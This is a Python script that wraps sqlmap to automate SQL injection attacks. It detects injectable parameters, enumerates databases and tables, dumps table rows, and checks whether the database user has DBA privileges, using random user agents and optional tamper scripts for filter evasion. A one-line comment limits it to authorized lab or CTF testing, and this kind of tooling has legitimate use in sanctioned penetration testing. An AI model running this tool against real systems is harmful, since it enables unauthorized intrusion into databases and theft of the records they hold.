#!/usr/bin/env python3
# For authorized testing in lab/CTF environments only
"""sqlmap automation agent for orchestrating SQL injection scans via subprocess."""

import argparse
import json
import logging
import re
import subprocess
import sys
from datetime import datetime, timezone
from typing import List, Optional

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)
MAX_PROFILE_DATABASES = 3
MAX_PROFILE_TABLES = 40
SQLMAP_TEST_OPTIONS = ("--level=3", "--risk=2")


def _base_command(sqlmap_bin: str, url: Optional[str], param: Optional[str],
                  request_file: Optional[str] = None, cookie: str = "") -> list:
    cmd = [
        sqlmap_bin,
        "--batch",
        "--random-agent",
        "--output-dir=/tmp/sqlmap_out",
        "--ignore-code=401",
    ]
    if request_file:
        cmd.extend(["-r", request_file])
    elif url:
        cmd.extend(["-u", url])
    else:
        raise ValueError("Either url or request_file is required")
    if param:
        cmd.extend(["-p", param])
    if cookie:
        cmd.extend(["--cookie", cookie])
    return cmd


def find_sqlmap() -> str:
    """Locate the sqlmap executable."""
    for path in ["sqlmap", "sqlmap.py", "/usr/bin/sqlmap", "/usr/local/bin/sqlmap"]:
        try:
            subprocess.run([path, "--version"], capture_output=True, timeout=5)
            return path
        except (FileNotFoundError, subprocess.TimeoutExpired):
            continue
    sys.exit("sqlmap not found. Install: pip install sqlmap")


def run_detection_scan(sqlmap_bin: str, url: Optional[str], param: Optional[str] = None,
                        request_file: Optional[str] = None,
                        cookie: str = "", tamper: str = "") -> dict:
    """Run sqlmap detection scan and parse results."""
    cmd = _base_command(sqlmap_bin, url, param, request_file, cookie)
    cmd.extend(SQLMAP_TEST_OPTIONS)
    if tamper:
        cmd.extend(["--tamper", tamper])

    logger.info("Running: %s", " ".join(cmd))
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

    output = f"{result.stdout}\n{result.stderr}"
    injectable = bool(
        re.search(
            r"(?i)\bparameter\s+['\"]?[^'\"\s]+['\"]?\s+"
            r"(?:appears to be\b[^\r\n]*\binjectable\b|"
            r"is\s+(?:['\"][^'\"]+['\"]\s+)?injectable\b)|"
            r"sqlmap identified the following injection point\(s\)",
            output,
        )
    )
    summary = [
        line.strip()[:300]
        for line in output.splitlines()
        if re.search(
            r"(?i)^\s*parameter:\s*|parameter\s+['\"]?[^'\"\s]+['\"]?\s+"
            r"(?:appears to be|does not appear to be|is vulnerable|is injectable)|"
            r"sqlmap identified the following injection point\(s\)|"
            r"back-end DBMS:",
            line,
        )
    ][:10]
    diagnostics = [
        line.strip()[:300]
        for line in output.splitlines()
        if any(
            marker in line.casefold()
            for marker in (
                "[error]",
                "[critical]",
                "[warning]",
                "json data found",
                "unable to parse",
                "unable to connect",
                "request file",
            )
        )
    ][:10]
    db_type = _extract_db_type(output)
    techniques = _extract_techniques(output)

    return {
        "scan_type": "detection",
        "url": url,
        "injectable": injectable,
        "database": db_type,
        "techniques": techniques,
        "summary": summary,
        "diagnostics": diagnostics,
        "exit_code": result.returncode,
    }


def enumerate_databases(sqlmap_bin: str, url: Optional[str],
                         param: Optional[str] = None, cookie: str = "",
                         request_file: Optional[str] = None) -> List[str]:
    """Enumerate databases using sqlmap --dbs."""
    cmd = _base_command(sqlmap_bin, url, param, request_file, cookie)
    cmd.extend(SQLMAP_TEST_OPTIONS)
    cmd.append("--dbs")

    result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
    _require_success(result, "database enumeration")
    databases = []
    in_db_section = False
    for line in result.stdout.split("\n"):
        if "available databases" in line.lower():
            in_db_section = True
        if in_db_section:
            for db_name in re.findall(r"\[\*\]\s*(\S+)", line):
                if db_name not in databases:
                    databases.append(db_name)
        if in_db_section and not line.strip():
            break

    logger.info("Found %d databases", len(databases))
    return databases


def enumerate_tables(sqlmap_bin: str, url: Optional[str], database: Optional[str],
                     param: Optional[str] = None, cookie: str = "",
                     request_file: Optional[str] = None) -> List[str]:
    """Enumerate tables in a database, or the SQLite schema when unspecified."""
    cmd = _base_command(sqlmap_bin, url, param, request_file, cookie)
    if database:
        cmd.extend(["-D", database])
    cmd.extend(SQLMAP_TEST_OPTIONS)
    cmd.append("--tables")

    result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
    _require_success(result, "table enumeration")
    tables = []
    for line in result.stdout.split("\n"):
        stripped = line.strip()
        if stripped.startswith("| ") and not stripped.startswith("+-"):
            table_name = stripped.strip("| ").strip()
            if table_name and table_name != "Table":
                tables.append(table_name)

    if not tables:
        raise RuntimeError("SQLMap table enumeration returned no table names")
    logger.info("Found %d tables in %s", len(tables), database or "SQLite schema")
    return tables


def _require_success(result: subprocess.CompletedProcess, action: str) -> None:
    if result.returncode != 0:
        raise RuntimeError(
            f"SQLMap {action} failed with exit code {result.returncode}"
        )


def run_schema_scan(sqlmap_bin: str, url: Optional[str], param: Optional[str],
                    request_file: Optional[str] = None, cookie: str = "",
                    database_type: str = "unknown") -> dict:
    """List database and table names without inspecting columns or row data."""
    profile = {"databases": [], "databases_truncated": False, "tables": [], "errors": []}
    if database_type.casefold() == "sqlite":
        databases: List[Optional[str]] = [None]
    else:
        try:
            found_databases = enumerate_databases(
                sqlmap_bin, url, param, cookie, request_file
            )
            if not found_databases:
                raise RuntimeError("SQLMap database enumeration returned no names")
            profile["databases"] = found_databases[:MAX_PROFILE_DATABASES]
            profile["databases_truncated"] = (
                len(found_databases) > MAX_PROFILE_DATABASES
            )
            databases = found_databases[:MAX_PROFILE_DATABASES]
        except RuntimeError as error:
            profile["errors"].append({"action": "dbs", "message": str(error)})
            databases = []

    for database in databases:
        try:
            tables = enumerate_tables(
                sqlmap_bin, url, database, param, cookie, request_file
            )
            profile["tables"].append({
                "database": database or "SQLite_masterdb",
                "tables": tables[:MAX_PROFILE_TABLES],
                "tables_truncated": len(tables) > MAX_PROFILE_TABLES,
            })
        except RuntimeError as error:
            profile["errors"].append({
                "action": "tables",
                "database": database or "SQLite_masterdb",
                "message": str(error),
            })

    profile["status"] = "partial" if profile["errors"] else "completed"
    return profile


def run_validation_scan(sqlmap_bin: str, url: Optional[str],
                        param: Optional[str] = None,
                        request_file: Optional[str] = None,
                        cookie: str = "") -> dict:
    """Confirm injection, then list database and table names only."""
    result = run_detection_scan(
        sqlmap_bin, url, param, request_file=request_file, cookie=cookie
    )
    profile = {"status": "skipped", "reason": "not_confirmed"}
    if result["exit_code"] == 0 and result["injectable"] is True:
        profile = run_schema_scan(
            sqlmap_bin,
            url,
            param,
            request_file=request_file,
            cookie=cookie,
            database_type=result["database"],
        )
    elif result["exit_code"] != 0:
        profile = {"status": "skipped", "reason": "detection_failed"}

    return {"action": "validate", "result": result, "profile": profile}


def dump_table(sqlmap_bin: str, url: str, database: str, table: str,
                columns: Optional[List[str]] = None, limit: int = 10,
                param: Optional[str] = None, cookie: str = "") -> dict:
    """Dump rows from a specific table with optional column and row limit."""
    cmd = [sqlmap_bin, "-u", url, "-D", database, "-T", table, "--dump",
           "--start=1", f"--stop={limit}", "--batch", "--random-agent"]
    if columns:
        cmd.extend(["-C", ",".join(columns)])
    if param:
        cmd.extend(["-p", param])
    if cookie:
        cmd.extend(["--cookie", cookie])

    result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
    return {
        "database": database,
        "table": table,
        "limit": limit,
        "output": result.stdout[-2000:] if len(result.stdout) > 2000 else result.stdout,
        "exit_code": result.returncode,
    }


def check_privileges(sqlmap_bin: str, url: str, param: Optional[str] = None,
                      cookie: str = "") -> dict:
    """Check current database user and DBA privileges."""
    cmd = [sqlmap_bin, "-u", url, "--current-user", "--current-db", "--is-dba",
           "--batch", "--random-agent"]
    if param:
        cmd.extend(["-p", param])
    if cookie:
        cmd.extend(["--cookie", cookie])

    result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
    output = result.stdout

    current_user = _extract_value(output, "current user")
    current_db = _extract_value(output, "current database")
    is_dba = "true" in output.lower().split("current user is DBA")[-1][:20].lower() if "current user is DBA" in output else False

    return {"current_user": current_user, "current_db": current_db, "is_dba": is_dba}


def _extract_db_type(output: str) -> str:
    match = re.search(r"(?im)\bback-end DBMS:\s*([^\r\n]+)", output)
    if match:
        detected_db = match.group(1).strip()
        for db in ["MySQL", "PostgreSQL", "Microsoft SQL Server", "Oracle", "SQLite"]:
            if detected_db.casefold().startswith(db.casefold()):
                return db
        return detected_db
    return "unknown"


def _extract_techniques(output: str) -> List[str]:
    injection_report = re.search(
        r"(?is)sqlmap identified the following injection point\(s\).*?"
        r"(?:\r?\n\s*-{3,}\s*\r?\n)?(.*?)(?:\r?\n\s*back-end DBMS:|$)",
        output,
    )
    if not injection_report:
        return []

    report_text = injection_report.group(1).lower()
    techniques = []
    for tech in ["boolean-based", "error-based", "UNION query", "stacked queries",
                 "time-based", "inline query"]:
        if tech.lower() in report_text:
            techniques.append(tech)
    return techniques


def _extract_value(output: str, label: str) -> str:
    for line in output.split("\n"):
        if label.lower() in line.lower():
            parts = line.split(":")
            if len(parts) > 1:
                return parts[-1].strip().strip("'\"")
    return ""


def main():
    parser = argparse.ArgumentParser(description="sqlmap Automation Agent")
    parser.add_argument("--url", help="Target URL with injectable param")
    parser.add_argument("--request-file", help="Raw captured HTTP request file")
    parser.add_argument("--param", help="Specific parameter to test")
    parser.add_argument("--cookie", default="", help="Cookie header value")
    parser.add_argument("--tamper", default="", help="Tamper scripts (comma-separated)")
    parser.add_argument(
        "--action",
        choices=["detect", "validate", "dbs", "tables", "dump", "privs"],
        default="detect",
    )
    parser.add_argument("--database", help="Database name for table/dump actions")
    parser.add_argument("--table", help="Table name for dump action")
    parser.add_argument("--output", default="sqlmap_report.json")
    args = parser.parse_args()

    if not args.url and not args.request_file:
        parser.error("either --url or --request-file is required")
    if args.request_file and args.action not in {"detect", "validate"}:
        parser.error("--request-file is supported only for detect or validate")

    sqlmap_bin = find_sqlmap()
    report = {
        "action": args.action,
        "url": args.url,
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }

    if args.action == "detect":
        report["result"] = run_detection_scan(
            sqlmap_bin,
            args.url,
            args.param,
            request_file=args.request_file,
            cookie=args.cookie,
            tamper=args.tamper,
        )
    elif args.action == "validate":
        report.update(
            run_validation_scan(
                sqlmap_bin,
                args.url,
                args.param,
                request_file=args.request_file,
                cookie=args.cookie,
            )
        )
    elif args.action == "dbs":
        report["databases"] = enumerate_databases(sqlmap_bin, args.url, args.param, args.cookie)
    elif args.action == "tables" and args.database:
        report["tables"] = enumerate_tables(sqlmap_bin, args.url, args.database, args.param, args.cookie)
    elif args.action == "dump" and args.database and args.table:
        report["dump"] = dump_table(sqlmap_bin, args.url, args.database, args.table,
                                     param=args.param, cookie=args.cookie)
    elif args.action == "privs":
        report["privileges"] = check_privileges(sqlmap_bin, args.url, args.param, args.cookie)

    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)
    logger.info("Report saved to %s", args.output)
    print(f"SQLI_MAP_REPORT={json.dumps(report, separators=(',', ':'))}")


if __name__ == "__main__":
    main()